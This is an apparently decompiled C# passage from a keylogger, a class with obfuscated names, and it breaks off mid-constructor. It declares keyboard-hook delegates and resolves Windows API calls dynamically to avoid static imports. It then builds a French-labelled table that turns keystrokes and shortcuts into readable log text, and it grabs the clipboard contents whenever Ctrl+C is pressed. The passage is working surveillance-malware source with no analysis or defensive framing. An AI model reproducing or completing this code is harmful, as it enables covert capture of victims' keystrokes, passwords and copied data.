using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

public class GClass0
{
	private delegate int Delegate0(int Code, int wParam, ref GStruct0 lParam);

	private delegate int Delegate1(int hHook);

	private delegate int Delegate2(int idHook, Delegate0 lpfn, int hmod, int dwThreadId);

	private delegate int Delegate3(int hHook, int nCode, int wParam, GStruct0 lParam);

	private delegate int Delegate4(int hwnd, StringBuilder lpString, int cch);

	public struct GStruct0
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;
	}

	private class Class4
	{
		private int int_0;

		private string string_0;

		private string string_1;

		private string string_2;

		private string string_3;

		private string string_4;

		private string string_5;

		private string string_6;

		private string string_7;

		private string string_8;

		private string string_9;

		private int int_1;

		public int Int32_0
		{
			get
			{
				return int_0;
			}
			set
			{
				int_0 = value;
			}
		}

		public string String_0
		{
			get
			{
				return string_0;
			}
			set
			{
				string_0 = value;
			}
		}

		public string String_1
		{
			get
			{
				return string_1;
			}
			set
			{
				string_1 = value;
			}
		}

		public string String_2
		{
			get
			{
				return string_2;
			}
			set
			{
				string_2 = value;
			}
		}

		public string String_3
		{
			get
			{
				return string_3;
			}
			set
			{
				string_3 = value;
			}
		}

		public string String_4
		{
			get
			{
				return string_4;
			}
			set
			{
				string_4 = value;
			}
		}

		public string String_5
		{
			get
			{
				return string_5;
			}
			set
			{
				string_5 = value;
			}
		}

		public string String_6
		{
			get
			{
				return string_6;
			}
			set
			{
				string_6 = value;
			}
		}

		public string String_7
		{
			get
			{
				return string_7;
			}
			set
			{
				string_7 = value;
			}
		}

		public string String_8
		{
			get
			{
				return string_8;
			}
			set
			{
				string_8 = value;
			}
		}

		public int Int32_1
		{
			get
			{
				return int_1;
			}
			set
			{
				int_1 = value;
			}
		}

		public Class4(int kCode, string kBase = "", string kShft = "", string kCtrl = "", string kAlt = "", string kWin = "", string kAltGr = "", string kWinShft = "", string kWinCtrl = "", string kAltShft = "", int kAccTrans = 0)
		{
			Int32_0 = kCode;
			String_0 = kShft;
			String_1 = kBase;
			String_2 = kCtrl;
			String_3 = kAlt;
			String_4 = kWin;
			String_5 = kAltGr;
			String_6 = kWinShft;
			String_7 = kWinCtrl;
			String_8 = kAltShft;
			Int32_1 = kAccTrans;
		}
	}

	private class Class5
	{
		private ArrayList arrayList_0;

		public Class4 this[int int_0] => (Class4)arrayList_0[int_0];

		public Class5()
		{
			arrayList_0 = new ArrayList();
		}

		public Class4 method_0(int int_0, string string_0 = "", string string_1 = "", string string_2 = "", string string_3 = "", string string_4 = "", string string_5 = "", string string_6 = "", string string_7 = "", string string_8 = "", int int_1 = 0)
		{
			Class4 @class = new Class4(int_0, string_0, string_1, string_2, string_4, string_5, string_3, string_6, string_7, string_8, int_1);
			arrayList_0.Add(@class);
			return @class;
		}
	}

	private int int_0;

	private short short_0;

	private int int_1;

	private int int_2;

	private IntPtr intptr_0;

	private string string_0;

	private Delegate0 delegate0_0;

	public string string_1;

	public string string_2;

	private bool bool_0;

	private bool bool_1;

	private bool bool_2;

	private bool bool_3;

	private bool bool_4;

	private bool bool_5;

	private bool bool_6;

	private bool bool_7;

	private bool bool_8;

	private bool bool_9;

	private bool bool_10;

	private bool bool_11;

	private char char_0;

	private bool bool_12;

	private string string_3;

	private Class5 class5_0;

	private string[,] string_4;

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_5);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_5);

	public T method_0<T>(string string_5, string string_6)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_5), ref string_6), typeof(T));
	}

	public GClass0()
	{
		int_0 = 257;
		short_0 = 256;
		int_1 = 260;
		int_2 = 261;
		intptr_0 = (IntPtr)0;
		string_0 = "";
		delegate0_0 = null;
		bool_0 = false;
		bool_1 = false;
		bool_2 = false;
		bool_3 = false;
		bool_4 = false;
		bool_5 = false;
		bool_6 = false;
		bool_7 = false;
		bool_8 = false;
		bool_9 = false;
		bool_10 = false;
		bool_11 = false;
		char_0 = '\0';
		bool_12 = ((Computer)Class2.Class1_0).get_Keyboard().get_CapsLock();
		string_3 = "";
		class5_0 = new Class5();
		string_4 = new string[512, 2]
		{
			{ "0", "" },
			{ "1", "☺" },
			{ "2", "☻" },
			{ "3", "♥" },
			{ "4", "♦" },
			{ "5", "♣" },
			{ "6", "♠" },
			{ "7", "•" },
			{ "8", "◘" },
			{ "9", "○" },
			{ "10", "◙" },
			{ "11", "♂" },
			{ "12", "♀" },
			{ "13", "♪" },
			{ "14", "♫" },
			{ "15", "☼" },
			{ "16", "►" },
			{ "17", "◄" },
			{ "18", "↕" },
			{ "19", "‼" },
			{ "20", "¶" },
			{ "21", "§" },
			{ "22", "▬" },
			{ "23", "↨" },
			{ "24", "↑" },
			{ "25", "↓" },
			{ "26", "→" },
			{ "27", "←" },
			{ "28", "∟" },
			{ "29", "↔" },
			{ "30", "▲" },
			{ "31", "▼" },
			{ "32", " " },
			{ "33", "!" },
			{ "34", "\"" },
			{ "35", "#" },
			{ "36", "$" },
			{ "37", "%" },
			{ "38", "&" },
			{ "39", "'" },
			{ "40", "(" },
			{ "41", ")" },
			{ "42", "*" },
			{ "43", "+" },
			{ "44", "," },
			{ "45", "-" },
			{ "46", "." },
			{ "47", "/" },
			{ "48", "0" },
			{ "49", "1" },
			{ "50", "2" },
			{ "51", "3" },
			{ "52", "4" },
			{ "53", "5" },
			{ "54", "6" },
			{ "55", "7" },
			{ "56", "8" },
			{ "57", "9" },
			{ "58", ":" },
			{ "59", ";" },
			{ "60", "<" },
			{ "61", "=" },
			{ "62", ">" },
			{ "63", "?" },
			{ "64", "@" },
			{ "65", "A" },
			{ "66", "B" },
			{ "67", "C" },
			{ "68", "D" },
			{ "69", "E" },
			{ "70", "F" },
			{ "71", "G" },
			{ "72", "H" },
			{ "73", "I" },
			{ "74", "J" },
			{ "75", "K" },
			{ "76", "L" },
			{ "77", "M" },
			{ "78", "N" },
			{ "79", "O" },
			{ "80", "P" },
			{ "81", "Q" },
			{ "82", "R" },
			{ "83", "S" },
			{ "84", "T" },
			{ "85", "U" },
			{ "86", "V" },
			{ "87", "W" },
			{ "88", "X" },
			{ "89", "Y" },
			{ "90", "Z" },
			{ "91", "[" },
			{ "92", "\\" },
			{ "93", "]" },
			{ "94", "^" },
			{ "95", "_" },
			{ "96", "`" },
			{ "97", "a" },
			{ "98", "b" },
			{ "99", "c" },
			{ "100", "d" },
			{ "101", "e" },
			{ "102", "f" },
			{ "103", "g" },
			{ "104", "h" },
			{ "105", "i" },
			{ "106", "j" },
			{ "107", "k" },
			{ "108", "l" },
			{ "109", "m" },
			{ "110", "n" },
			{ "111", "o" },
			{ "112", "p" },
			{ "113", "q" },
			{ "114", "r" },
			{ "115", "s" },
			{ "116", "t" },
			{ "117", "u" },
			{ "118", "v" },
			{ "119", "w" },
			{ "120", "x" },
			{ "121", "y" },
			{ "122", "z" },
			{ "123", "{" },
			{ "124", "|" },
			{ "125", "}" },
			{ "126", "~" },
			{ "127", "⌂" },
			{ "128", "Ç" },
			{ "129", "ü" },
			{ "130", "é" },
			{ "131", "â" },
			{ "132", "ä" },
			{ "133", "à" },
			{ "134", "å" },
			{ "135", "ç" },
			{ "136", "ê" },
			{ "137", "ë" },
			{ "138", "è" },
			{ "139", "ï" },
			{ "140", "î" },
			{ "141", "ì" },
			{ "142", "Ä" },
			{ "143", "Å" },
			{ "144", "É" },
			{ "145", "æ" },
			{ "146", "Æ" },
			{ "147", "ô" },
			{ "148", "ö" },
			{ "149", "ò" },
			{ "150", "û" },
			{ "151", "ù" },
			{ "152", "ÿ" },
			{ "153", "Ö" },
			{ "154", "Ü" },
			{ "155", "ø" },
			{ "156", "£" },
			{ "157", "Ø" },
			{ "158", "×" },
			{ "159", "ƒ" },
			{ "160", "á" },
			{ "161", "í" },
			{ "162", "ó" },
			{ "163", "ú" },
			{ "164", "ñ" },
			{ "165", "Ñ" },
			{ "166", "ª" },
			{ "167", "º" },
			{ "168", "¿" },
			{ "169", "®" },
			{ "170", "¬" },
			{ "171", "½" },
			{ "172", "¼" },
			{ "173", "¡" },
			{ "174", "«" },
			{ "175", "»" },
			{ "176", "░" },
			{ "177", "▒" },
			{ "178", "▓" },
			{ "179", "│" },
			{ "180", "┤" },
			{ "181", "Á" },
			{ "182", "Â" },
			{ "183", "À" },
			{ "184", "©" },
			{ "185", "╣" },
			{ "186", "║" },
			{ "187", "╗" },
			{ "188", "╝" },
			{ "189", "¢" },
			{ "190", "¥" },
			{ "191", "┐" },
			{ "192", "└" },
			{ "193", "┴" },
			{ "194", "┬" },
			{ "195", "├" },
			{ "196", "─" },
			{ "197", "┼" },
			{ "198", "ã" },
			{ "199", "Ã" },
			{ "200", "╚" },
			{ "201", "╔" },
			{ "202", "╩" },
			{ "203", "╦" },
			{ "204", "╠" },
			{ "205", "═" },
			{ "206", "╬" },
			{ "207", "¤" },
			{ "208", "ð" },
			{ "209", "Ð" },
			{ "210", "Ê" },
			{ "211", "Ë" },
			{ "212", "È" },
			{ "213", "ı" },
			{ "214", "Í" },
			{ "215", "Î" },
			{ "216", "Ï" },
			{ "217", "┘" },
			{ "218", "┌" },
			{ "219", "█" },
			{ "220", "▄" },
			{ "221", "¦" },
			{ "222", "Ì" },
			{ "223", "▀" },
			{ "224", "Ó" },
			{ "225", "ß" },
			{ "226", "Ô" },
			{ "227", "Ò" },
			{ "228", "õ" },
			{ "229", "Õ" },
			{ "230", "µ" },
			{ "231", "þ" },
			{ "232", "Þ" },
			{ "233", "Ú" },
			{ "234", "Û" },
			{ "235", "Ù" },
			{ "236", "ý" },
			{ "237", "Ý" },
			{ "238", "\u00af" },
			{ "239", "\u00b4" },
			{ "240", "\u00ad" },
			{ "241", "±" },
			{ "242", "‗" },
			{ "243", "¾" },
			{ "244", "¶" },
			{ "245", "§" },
			{ "246", "↑" },
			{ "247", "\u00b8" },
			{ "248", "°" },
			{ "249", "\u00a8" },
			{ "250", "·" },
			{ "251", "¹" },
			{ "252", "³" },
			{ "253", "²" },
			{ "254", "■" },
			{ "255", "\u00a0" },
			{ "0", "" },
			{ "1", "" },
			{ "2", "" },
			{ "3", "" },
			{ "4", "" },
			{ "5", "" },
			{ "6", "" },
			{ "7", "" },
			{ "8", "" },
			{ "9", "" },
			{ "10", "" },
			{ "11", "" },
			{ "12", "" },
			{ "13", "" },
			{ "14", "" },
			{ "15", "" },
			{ "16", "" },
			{ "17", "" },
			{ "18", "" },
			{ "19", "" },
			{ "20", "" },
			{ "21", "" },
			{ "22", "" },
			{ "23", "" },
			{ "24", "" },
			{ "25", "" },
			{ "26", "" },
			{ "27", "" },
			{ "28", "" },
			{ "29", "" },
			{ "30", "" },
			{ "31", "" },
			{ "032", " " },
			{ "033", "!" },
			{ "034", "\"" },
			{ "035", "#" },
			{ "036", "$" },
			{ "037", "%" },
			{ "038", "&" },
			{ "039", "'" },
			{ "040", "(" },
			{ "041", ")" },
			{ "042", "*" },
			{ "043", "+" },
			{ "044", "," },
			{ "045", "-" },
			{ "046", "." },
			{ "047", "/" },
			{ "048", "0" },
			{ "049", "1" },
			{ "050", "2" },
			{ "051", "3" },
			{ "052", "4" },
			{ "053", "5" },
			{ "054", "6" },
			{ "055", "7" },
			{ "056", "8" },
			{ "057", "9" },
			{ "058", ":" },
			{ "059", ";" },
			{ "060", "<" },
			{ "061", "=" },
			{ "062", ">" },
			{ "063", "?" },
			{ "064", "@" },
			{ "065", "A" },
			{ "066", "B" },
			{ "067", "C" },
			{ "068", "D" },
			{ "069", "E" },
			{ "070", "F" },
			{ "071", "G" },
			{ "072", "H" },
			{ "073", "I" },
			{ "074", "J" },
			{ "075", "K" },
			{ "076", "L" },
			{ "077", "M" },
			{ "078", "N" },
			{ "079", "O" },
			{ "080", "P" },
			{ "081", "Q" },
			{ "082", "R" },
			{ "083", "S" },
			{ "084", "T" },
			{ "085", "U" },
			{ "086", "V" },
			{ "087", "W" },
			{ "088", "X" },
			{ "089", "Y" },
			{ "090", "Z" },
			{ "091", "[" },
			{ "092", "\\" },
			{ "093", "]" },
			{ "094", "^" },
			{ "095", "_" },
			{ "096", "`" },
			{ "097", "a" },
			{ "098", "b" },
			{ "099", "c" },
			{ "0100", "d" },
			{ "0101", "e" },
			{ "0102", "f" },
			{ "0103", "g" },
			{ "0104", "h" },
			{ "0105", "i" },
			{ "0106", "j" },
			{ "0107", "k" },
			{ "0108", "l" },
			{ "0109", "m" },
			{ "0110", "n" },
			{ "0111", "o" },
			{ "0112", "p" },
			{ "0113", "q" },
			{ "0114", "r" },
			{ "0115", "s" },
			{ "0116", "t" },
			{ "0117", "u" },
			{ "0118", "v" },
			{ "0119", "w" },
			{ "0120", "x" },
			{ "0121", "y" },
			{ "0122", "z" },
			{ "0123", "{" },
			{ "0124", "|" },
			{ "0125", "}" },
			{ "0126", "~" },
			{ "0127", "\u007f" },
			{ "0128", "€" },
			{ "0129", "\u0081" },
			{ "0130", "‚" },
			{ "0131", "ƒ" },
			{ "0132", "„" },
			{ "0133", "…" },
			{ "0134", "†" },
			{ "0135", "‡" },
			{ "0136", "ˆ" },
			{ "0137", "‰" },
			{ "0138", "Š" },
			{ "0139", "‹" },
			{ "0140", "Œ" },
			{ "0141", "\u008d" },
			{ "0142", "Ž" },
			{ "0143", "\u008f" },
			{ "0144", "\u0090" },
			{ "0145", "‘" },
			{ "0146", "’" },
			{ "0147", "\"" },
			{ "148", "\"" },
			{ "0149", "•" },
			{ "0150", "–" },
			{ "0151", "—" },
			{ "0152", "\u02dc\u02dc" },
			{ "0153", "™" },
			{ "0154", "š" },
			{ "0155", "›" },
			{ "0156", "œ" },
			{ "0157", "\u009d" },
			{ "0158", "ž" },
			{ "0159", "Ÿ" },
			{ "0160", "\u00a0" },
			{ "0161", "¡" },
			{ "0162", "¢" },
			{ "0163", "£" },
			{ "0164", "¤" },
			{ "0165", "¥" },
			{ "0166", "¦" },
			{ "0167", "§" },
			{ "0168", "\u00a8" },
			{ "0169", "©" },
			{ "0170", "ª" },
			{ "0171", "«" },
			{ "0172", "¬" },
			{ "0173", "\u00ad" },
			{ "0174", "®" },
			{ "0175", "\u00af" },
			{ "0176", "°" },
			{ "0177", "±" },
			{ "0178", "²" },
			{ "0179", "³" },
			{ "0180", "\u00b4" },
			{ "0181", "µ" },
			{ "0182", "¶" },
			{ "0183", "·" },
			{ "0184", "\u00b8" },
			{ "0185", "¹" },
			{ "0186", "º" },
			{ "0187", "»" },
			{ "0188", "¼" },
			{ "0189", "½" },
			{ "0190", "¾" },
			{ "0191", "¿" },
			{ "0192", "À" },
			{ "0193", "Á" },
			{ "0194", "Â" },
			{ "0195", "Ã" },
			{ "0196", "Ä" },
			{ "0197", "Å" },
			{ "0198", "Æ" },
			{ "0199", "Ç" },
			{ "0200", "È" },
			{ "0201", "É" },
			{ "0202", "Ê" },
			{ "0203", "Ë" },
			{ "0204", "Ì" },
			{ "0205", "Í" },
			{ "0206", "Î" },
			{ "0207", "Ï" },
			{ "0208", "Ð" },
			{ "0209", "Ñ" },
			{ "0210", "Ò" },
			{ "0211", "Ó" },
			{ "0212", "Ô" },
			{ "0213", "Õ" },
			{ "0214", "Ö" },
			{ "0215", "×" },
			{ "0216", "Ø" },
			{ "0217", "Ù" },
			{ "0218", "Ú" },
			{ "0219", "Û" },
			{ "0220", "Ü" },
			{ "0221", "Ý" },
			{ "0222", "Þ" },
			{ "0223", "ß" },
			{ "0224", "à" },
			{ "0225", "á" },
			{ "0226", "â" },
			{ "0227", "ã" },
			{ "0228", "ä" },
			{ "0229", "å" },
			{ "0230", "æ" },
			{ "0231", "ç" },
			{ "0232", "è" },
			{ "0233", "é" },
			{ "0234", "ê" },
			{ "0235", "ë" },
			{ "0236", "ì" },
			{ "0237", "í" },
			{ "0238", "î" },
			{ "0239", "ï" },
			{ "0240", "ð" },
			{ "0241", "ñ" },
			{ "0242", "ò" },
			{ "0243", "ó" },
			{ "0244", "ô" },
			{ "0245", "õ" },
			{ "0246", "ö" },
			{ "0247", "÷" },
			{ "0248", "ø" },
			{ "0249", "ù" },
			{ "0250", "ú" },
			{ "0251", "û" },
			{ "0252", "ü" },
			{ "0253", "ý" },
			{ "0254", "þ" },
			{ "0255", "ÿ" }
		};
		class5_0.method_0(0);
		class5_0.method_0(1, "[CLIC GAUCHE]");
		class5_0.method_0(2, "[CLIC DROIT]");
		class5_0.method_0(3, "[ANNULATION]");
		class5_0.method_0(4, "[CLIC BOUTON MILIEU]");
		class5_0.method_0(5, "[CLIC BOUTON 4]");
		class5_0.method_0(6, "[CLIC BOUTON 5]");
		class5_0.method_0(7);
		class5_0.method_0(8, "[RETOUR ARRIERE]");
		class5_0.method_0(9, "[TABULATION]", "", "", "[PERMUTATION FENETRE GAUCHE]", "[PERMUTATION FENETRE DROITE]", "[FLIP 3D DROITE]", "[FLIP 3D GAUCHE]", "[FIGER LE FLIP 3D]");
		class5_0.method_0(10);
		class5_0.method_0(11);
		class5_0.method_0(12, "[NETTOYER]");
		class5_0.method_0(13, Environment.NewLine + "[ENTER]");
		class5_0.method_0(14);
		class5_0.method_0(15);
		class5_0.method_0(16, "[SHIFT]", "", "", "", "[BASCULER CLAVIER]");
		class5_0.method_0(17, "[CONTROL]");
		class5_0.method_0(18, "[ALT]");
		class5_0.method_0(19, "[PAUSE]", "", "", "", "", "[PANNEAU INFOS SYS]");
		class5_0.method_0(20, "[CAPS LOCK]");
		class5_0.method_0(21);
		class5_0.method_0(22);
		class5_0.method_0(23);
		class5_0.method_0(24);
		class5_0.method_0(25);
		class5_0.method_0(26);
		class5_0.method_0(27, "[ECHAP]", "", "", "", "[PARCOURIR LES FENETRES]", "[MENU DEMARRER]");
		class5_0.method_0(28);
		class5_0.method_0(29);
		class5_0.method_0(30);
		class5_0.method_0(31);
		class5_0.method_0(32, " ", "", "", "", "[MENU CONTEXTUEL]", "", "", "", "", 1);
		class5_0.method_0(33, "[▲]");
		class5_0.method_0(34, "[▼]");
		class5_0.method_0(35, "[FIN / FIN LIGNE]", "[SLCT CURSEUR-FIN LIGNE]", "[FIN DOCUMENT]");
		class5_0.method_0(36, "[DEBUT / DEBUT LIGNE]", "[SLCT DEBUT LIGNE-CURSEUR]", "[DEBUT DOCUMENT]");
		class5_0.method_0(37, "[GAUCHE]", "[SLCT GAUCHE]", "[DPL GAUCHE PAR GROUPE]", "", "[DPL GAUCHE PAR GROUPE]");
		class5_0.method_0(38, "[HAUT]", "[SLCT HAUT]");
		class5_0.method_0(39, "[DROIT]", "[SLCT DROITE]", "[DPL DROITE PAR GROUPE]", "", "[DPL DROITE PAR GROUPE]");
		class5_0.method_0(40, "[BAS]", "[SLCT BAS]");
		class5_0.method_0(41, "[SELECTION]");
		class5_0.method_0(42, "[IMRPIMER");
		class5_0.method_0(43, "[EXECUTER]");
		class5_0.method_0(44, "[IMPRIM ECRAN]", "", "", "", "[SCREENSHOT FENETRE EN COURS]");
		class5_0.method_0(45, "[INSERER]", "[INSERER PRESSE PAPIER]");
		class5_0.method_0(46, "[SUPPRIMER]", "[SUPPRIMER ← OU SUPPRIMER FICHIER]", "[SUPPRIMER RESTE DE LA LIGNE]", "[GESTIONNAIRE DE TACHES]");
		class5_0.method_0(47, "[AIDE]");
		class5_0.method_0(48, "à", "0", "", "@", "", "", "", "", "", 1);
		class5_0.method_0(49, "[écommer]", "1", "", "", "", "", "", "", "", 1);
		class5_0.method_0(50, "é", "2", "", "~", "", "", "", "", "", 1);
		class5_0.method_0(51, "\"", "3", "", "#", "", "", "", "", "", 1);
		class5_0.method_0(52, "'", "4", "", "{", "", "", "", "", "", 1);
		class5_0.method_0(53, "(", "5", "", "[", "", "", "", "", "", 1);
		class5_0.method_0(54, "-", "6", "", "|", "", "", "", "", "", 1);
		class5_0.method_0(55, "è", "7", "", "`", "", "", "", "", "", 1);
		class5_0.method_0(56, "_", "8", "", "\\", "", "", "", "", "", 1);
		class5_0.method_0(57, "ç", "9", "", "^", "", "", "", "", "", 1);
		class5_0.method_0(58);
		class5_0.method_0(59);
		class5_0.method_0(60);
		class5_0.method_0(61);
		class5_0.method_0(62);
		class5_0.method_0(63);
		class5_0.method_0(64);
		class5_0.method_0(65, "a", "A", "[SELECTIONNER TOUT]", "", "", "", "", "", "", 2);
		class5_0.method_0(66, "b", "B", "[ORGANISER FAVORIS]", "", "", "", "", "", "", 1);
		class5_0.method_0(67, "c", "C", "[COPIER (CTRL+C)]\r\nPresse-Papier : " + ((Computer)Class2.Class1_0).get_Clipboard().GetText() + "\r\n", "", "", "", "", "", "", 1);
		class5_0.method_0(68, "d", "D", "", "", "", "[REDUIRE TOUT]", "", "", "", 1);
		class5_0.method_0(69, "e", "E", "", "", "", "[EXPLORATEUR]", "", "", "", 2);
		class5_0.method_0(70, "f", "F", "[RECHERCHER]", "", "", "[RECHERCHER]", "", "[RECHERCHER UN PC]", "", 1);
		class5_0.method_0(71, "g", "G", "", "", "", "", "", "", "", 1);
		class5_0.method_0(72, "h", "H", "[REMPLACER]", "", "", "", "", "", "", 1);
		class5_0.method_0(73, "i", "I", "", "", "", "", "", "", "", 2);
		class5_0.method_0(74, "j", "J", "", "", "", "", "", "", "", 1);
		class5_0.method_0(75, "k", "K", "", "", "", "", "", "", "", 1);
		class5_0.method_0(76, "l", "L", "", "", "", "[VERROUILLER SESSION]", "", "", "", 1);
		class5_0.method_0(77, "m", "M", "", "", "", "[REDUIRE TOUT]", "[RESTAURER TOUT]", "", "", 1);
		class5_0.method_0(78, "n", "N", "[NOUVEAU]", "", "", "", "", "", "", 2);
		class5_0.method_0(79, "o", "O", "[OUVRIR]", "", "", "", "", "", "", 2);
		class5_0.method_0(80, "p", "P", "[IMPRIMER]", "", "", "", "", "", "", 1);
		class5_0.method_0(81, "q", "Q", "", "", "", "", "", "", "", 1);
		class5_0.method_0(82, "r", "R", "", "", "", "[EXECUTER]", "", "", "", 1);
		class5_0.method_0(83, "s", "S", "[ENREGISTRER]", "", "", "", "", "", "", 1);
		class5_0.method_0(84, "t", "T", "", "", "", "", "", "", "", 1);
		class5_0.method_0(85, "u", "U", "", "", "", "[GESTIONNAIRE UTILS]", "", "", "", 2);
		class5_0.method_0(86, "v", "V", "[COLLER (CTRL+V]]", "", "", "", "", "", "", 1);
		class5_0.method_0(87, "w", "W", "[FERMER (ALT+F4)]", "", "", "", "", "", "", 1);
		class5_0.method_0(88, "x", "X", "[COUPER (CTRL+X)]", "", "", "[CENTRE MOBILITE]", "", "", "", 1);
		class5_0.method_0(89, "y", "Y", "[RETABLIR]", "", "", "", "", "", "", 1);
		class5_0.method_0(90, "z", "Z", "[ANNULER]", "", "", "", "", "", "", 1);
		class5_0.method_0(91, "[WIN GAUCHE]");
		class5_0.method_0(92, "[WIN DROITE]");
		class5_0.method_0(93, "[APPLICATION]");
		class5_0.method_0(94);
		class5_0.method_0(95, "[VEILLE]");
		class5_0.method_0(96, "0", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(97, "1", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(98, "2", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(99, "3", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(100, "4", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(101, "5", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(102, "6", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(103, "7", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(104, "8", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(105, "9", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(106, "*", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(107, "+", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(108, "[SEPARATEUR]", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(109, "-", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(110, ".", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(111, "/", "", "", "", "", "", "", "", "", 1);
		class5_0.method_0(112, "[AIDE (F1)]", "", "", "", "", "[AIDE WINDOWS (ALT+F1)]");
		class5_0.method_0(113, "[RENOMMER (F2)]");
		class5_0.method_0(114, "[RECHERCHER (F3)]");
		class5_0.method_0(115, "[F4]", "", "", "", "[FERMER PROGRAMME (ALT+F4)]");
		class5_0.method_0(116, "[RAFRAICHIR (F5)]");
		class5_0.method_0(117, "[F6]");
		class5_0.method_0(118, "[F7]");
		class5_0.method_0(119, "[F8]");
		class5_0.method_0(120, "[F9]");
		class5_0.method_0(121, "[ACTIVER BARRE MENU (F10)]");
		class5_0.method_0(122, "[F11]");
		class5_0.method_0(123, "[F12]");
		class5_0.method_0(124, "[F13]");
		class5_0.method_0(125, "[F14]");
		class5_0.method_0(126, "[F15]");
		class5_0.method_0(127, "[F16]");
		class5_0.method_0(128, "[F17]");
		class5_0.method_0(129, "[F18]");
		class5_0.method_0(130, "[F19]");
		class5_0.method_0(131, "[F20]");
		class5_0.method_0(132, "[F21]");
		class5_0.method_0(133, "[F22]");
		class5_0.method_0(134, "[F23]");
		class5_0.method_0(135, "[F24]");
		class5_0.method_0(136);
		class5_0.method_0(137);
		class5_0.method_0(138);
		class5_0.method_0(139);
		class5_0.method_0(140);
		class5_0.method_0(141);
		class5_0.method_0(142);
		class5_0.method_0(143);
		class5_0.method_0(144, "[VERR NUM]");
		class5_0.method_0(145, "[ARRET DEFIL]");
		class5_0.method_0(146);
		class5_0.method_0(147);
		class5_0.method_0(148);
		class5_0.method_0(149);
		class5_0.method_0(150);
		class5_0.method_0(151);
		class5_0.method_0(152);
		class5_0.method_0(153);
		class5_0.method_0(154);
		class5_0.method_0(155);
		class5_0.method_0(156);
		class5_0.method_0(157);
		class5_0.method_0(158);
		class5_0.method_0(159);
		class5_0.method_0(160, "[SHIFT GAUCHE]");
		class5_0.method_0(161, "[SHIFT DROITE]");
		class5_0.method_0(162, "[CONTROL GAUCHE]");
		class5_0.method_0(163, "[CONTROL DROITE]");
		class5_0.method_0(164, "[ALT GAUCHE]");
		class5_0.method_0(165, "[ALT DROITE]");
		class5_0.method_0(166, "[NAVIG +]");
		class5_0.method_0(167, "[NAVIG -]");
		class5_0.method_0(168, "[NAVIG RAFRAICHIR]");
		class5_0.method_0(169, "[NAVIG STOP]");
		class5_0.method_0(170, "[NAVIG RECHERCHER]");
		class5_0.method_0(171, "[NAVIG FAVORIS]");
		class5_0.method_0(172, "[NAVIG HOME]");
		class5_0.method_0(173, "[COUPER SON]");
		class5_0.method_0(174, "[VOL -]");
		class5_0.method_0(175, "[VOL +]");
		class5_0.method_0(176, "[PISTE +]");
		class5_0.method_0(177, "[PISTE -]");
		class5_0.method_0(178, "[STOP]");
		class5_0.method_0(179, "[MARCHE/PAUSE]");
		class5_0.method_0(180, "[MAIL]");
		class5_0.method_0(181, "[MEDIA]");
		class5_0.method_0(182, "[APPLICATION 1]");
		class5_0.method_0(183, "[APPLICATION 2]");
		class5_0.method_0(184);
		class5_0.method_0(185);
		class5_0.method_0(186, "$", "£", "", "¤", "", "", "", "", "", 1);
		class5_0.method_0(187, "=", "+", "", "}", "", "", "", "", "", 1);
		class5_0.method_0(188, ",", "?", "", "", "", "", "", "", "", 1);
		class5_0.method_0(189);
		class5_0.method_0(190, ";", ".", "", "", "", "", "", "", "", 1);
		class5_0.method_0(191, ":", "/", "", "", "", "", "", "", "", 1);
		class5_0.method_0(192, "ù", "%", "", "", "", "", "", "", "", 1);
		class5_0.method_0(193);
		class5_0.method_0(194);
		class5_0.method_0(195);
		class5_0.method_0(196);
		class5_0.method_0(197);
		class5_0.method_0(198);
		class5_0.method_0(199);
		class5_0.method_0(200);
		class5_0.method_0(201);
		class5_0.method_0(202);
		class5_0.method_0(203);
		class5_0.method_0(204);
		class5_0.method_0(205);
		class5_0.method_0(206);
		class5_0.method_0(207);
		class5_0.method_0(208);
		class5_0.method_0(209);
		class5_0.method_0(210);
		class5_0.method_0(211);
		class5_0.method_0(212);
		class5_0.method_0(213);
		class5_0.method_0(214);
		class5_0.method_0(215);
		class5_0.method_0(216);
		class5_0.method_0(217);
		class5_0.method_0(218);
		class5_0.method_0(219, ")", "°", "", "]", "", "", "", "", "", 1);
		class5_0.method_0(220, "*", "µ", "", "", "", "", "", "", "", 1);
		class5_0.method_0(221, "^", "\u00a8", "", "", "", "", "", "", "", 1);
		class5_0.method_0(222);
		class5_0.method_0(223, "!", "§", "", "", "", "", "", "", "", 1);
		class5_0.method_0(224);
		class5_0.method_0(225);
		class5_0.method_0(226, "<", ">", "", "", "", "", "", "", "", 1);
		class5_0.method_0(227);
		class5_0.method_0(228);
		class5_0.method_0(229, "[PROCESS]");
		class5_0.method_0(230);
		class5_0.method_0(231);
		class5_0.method_0(232);
		class5_0.method_0(233);
		class5_0.method_0(234);
		class5_0.method_0(235);
		class5_0.method_0(236);
		class5_0.method_0(237);
		class5_0.method_0(238);
		class5_0.method_0(239);
		class5_0.method_0(240);
		class5_0.method_0(241);
		class5_0.method_0(242);
		class5_0.method_0(243);
		class5_0.method_0(244);
		class5_0.method_0(245);
		class5_0.method_0(246, "[ATTN]");
